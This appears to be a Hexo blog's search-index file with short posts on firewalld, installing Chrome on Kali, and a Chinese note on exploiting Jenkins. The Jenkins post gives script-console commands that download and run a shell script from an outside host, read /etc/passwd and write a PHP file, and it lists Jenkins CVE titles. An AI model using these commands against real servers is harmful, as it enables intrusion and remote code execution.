@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Firwall</title>
+    <url>/2021/03/05/firwall/</url>
+    <content><![CDATA[<p>firewalld 、firewall-cmd 、firewall-offline-cmd它们Python脚本，通过定义的在/usr/lib/firewalld下面的xml配置信息，在启动时自动载入默认iptables配置，并应用到系统中，当使用firewalld-cmd添加防火墙规则时，它实际是转换成iptables规则后，在应用到系统中</p>
+<span id="more"></span>]]></content>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kali-install-Chrome</title>
+    <url>/2021/03/05/Kali-install-Chrome/</url>
+    <content><![CDATA[<h1 id="Kali-install-Chrome-Browser"><a href="#Kali-install-Chrome-Browser" class="headerlink" title="Kali install Chrome Browser"></a>Kali install Chrome Browser</h1> <span id="more"></span>
+<h2 id="gt-come-on-👍"><a href="#gt-come-on-👍" class="headerlink" title="&gt; come on ! 👍"></a>&gt; come on ! 👍</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</span><br><span class="line">apt install ./google-chrome-stable_current_amd64.deb</span><br></pre></td></tr></table></figure>
+
+<p>☞：Use root permissions</p>
+]]></content>
+      <tags>
+        <tag>Kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Jenkins利用探索</title>
+    <url>/2021/03/03/Jenkins/</url>
+    <content><![CDATA[<p>Jenkins利用探索<br> <span id="more"></span></p>
+<h2 id="gt-常规"><a href="#gt-常规" class="headerlink" title="&gt; 常规"></a>&gt; 常规</h2><p>登录访问：<a href="http://1.1.1.1/script">http://1.1.1.1/script</a></p>
+<p>命令执行</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">println <span class="string">&quot;wget http://1.1.1.1/back.sh -P /tmp/&quot;</span>.execute().text</span><br><span class="line">println <span class="string">&quot;bash /tmp/back.sh&quot;</span>.execute().text</span><br></pre></td></tr></table></figure>
+
+<p>读文件</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> File(<span class="string">&quot;/etc/passwd&quot;</span>).getText();</span><br></pre></td></tr></table></figure>
+
+<p>写文件</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> File(<span class="string">&quot;/tmp/1.php&quot;</span>).write(<span class="string">&#x27;&lt;?PHPINFO?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>多行写入</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> File(<span class="string">&quot;/tmp/1.php&quot;</span>).write(<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    test</span></span><br><span class="line"><span class="string">    test</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="通过漏洞"><a href="#通过漏洞" class="headerlink" title="通过漏洞"></a>通过漏洞</h2><h3 id="gt-CVE列表"><a href="#gt-CVE列表" class="headerlink" title="&gt; CVE列表"></a>&gt; CVE列表</h3><h4 id="gt-CVE-2015-8103-反序列化远程代码执行"><a href="#gt-CVE-2015-8103-反序列化远程代码执行" class="headerlink" title="&gt; CVE-2015-8103 反序列化远程代码执行"></a>&gt; CVE-2015-8103 反序列化远程代码执行</h4><h4 id="gt-CVE-2016-0788-Jenkins-CI和LTS-远程代码执行漏洞"><a href="#gt-CVE-2016-0788-Jenkins-CI和LTS-远程代码执行漏洞" class="headerlink" title="&gt; CVE-2016-0788 Jenkins CI和LTS 远程代码执行漏洞"></a>&gt; CVE-2016-0788 Jenkins CI和LTS 远程代码执行漏洞</h4><h4 id="gt-CVE-2016-0792-低权限用户命令执行"><a href="#gt-CVE-2016-0792-低权限用户命令执行" class="headerlink" title="&gt; CVE-2016-0792 低权限用户命令执行"></a>&gt; CVE-2016-0792 低权限用户命令执行</h4><h4 id="gt-CVE-2016-9299-代码执行"><a href="#gt-CVE-2016-9299-代码执行" class="headerlink" title="&gt; CVE-2016-9299 代码执行"></a>&gt; CVE-2016-9299 代码执行</h4><h4 id="gt-CVE-2017-1000353-Jenkins-CI-远程代码执行"><a href="#gt-CVE-2017-1000353-Jenkins-CI-远程代码执行" class="headerlink" title="&gt; CVE-2017-1000353 Jenkins-CI 远程代码执行"></a>&gt; CVE-2017-1000353 Jenkins-CI 远程代码执行</h4><h4 id="gt-CVE-2018-1000110-用户枚举"><a href="#gt-CVE-2018-1000110-用户枚举" class="headerlink" title="&gt; CVE-2018-1000110 用户枚举"></a>&gt; CVE-2018-1000110 用户枚举</h4><h4 id="gt-CVE-2018-1000861-远程命令执行"><a href="#gt-CVE-2018-1000861-远程命令执行" class="headerlink" title="&gt; CVE-2018-1000861 远程命令执行"></a>&gt; CVE-2018-1000861 远程命令执行</h4><h4 id="gt-CVE-2018-1999002-任意文件读取"><a href="#gt-CVE-2018-1999002-任意文件读取" class="headerlink" title="&gt; CVE-2018-1999002 任意文件读取"></a>&gt; CVE-2018-1999002 任意文件读取</h4><h4 id="gt-CVE-2018-1000600-Jenkins-GitHub-信息泄露"><a href="#gt-CVE-2018-1000600-Jenkins-GitHub-信息泄露" class="headerlink" title="&gt; CVE-2018-1000600 Jenkins GitHub 信息泄露"></a>&gt; CVE-2018-1000600 Jenkins GitHub 信息泄露</h4><h4 id="gt-CVE-2019-1003000-远程代码执行"><a href="#gt-CVE-2019-1003000-远程代码执行" class="headerlink" title="&gt; CVE-2019-1003000 远程代码执行"></a>&gt; CVE-2019-1003000 远程代码执行</h4><h4 id="gt-CVE-2019-1003005-远程代码执行"><a href="#gt-CVE-2019-1003005-远程代码执行" class="headerlink" title="&gt; CVE-2019-1003005 远程代码执行"></a>&gt; CVE-2019-1003005 远程代码执行</h4><h4 id="gt-CVE-2019-1003029-Script-Security-Plugin沙箱绕过"><a href="#gt-CVE-2019-1003029-Script-Security-Plugin沙箱绕过" class="headerlink" title="&gt; CVE-2019-1003029 Script Security Plugin沙箱绕过"></a>&gt; CVE-2019-1003029 Script Security Plugin沙箱绕过</h4><h4 id="gt-CVE-2019-10392-Jenkins-Git-插件命令执行"><a href="#gt-CVE-2019-10392-Jenkins-Git-插件命令执行" class="headerlink" title="&gt; CVE-2019-10392 Jenkins Git 插件命令执行"></a>&gt; CVE-2019-10392 Jenkins Git 插件命令执行</h4><h4 id="gt-CVE-2019-10352-任意文件写入"><a href="#gt-CVE-2019-10352-任意文件写入" class="headerlink" title="&gt; CVE-2019-10352 任意文件写入"></a>&gt; CVE-2019-10352 任意文件写入</h4><h4 id="gt-CVE-2019-10300-GitLab插件信息泄露漏洞"><a href="#gt-CVE-2019-10300-GitLab插件信息泄露漏洞" class="headerlink" title="&gt; CVE-2019-10300 GitLab插件信息泄露漏洞"></a>&gt; CVE-2019-10300 GitLab插件信息泄露漏洞</h4>]]></content>
+      <tags>
+        <tag>漏洞利用</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2021/03/03/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.<br> <span id="more"></span></p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+</search>
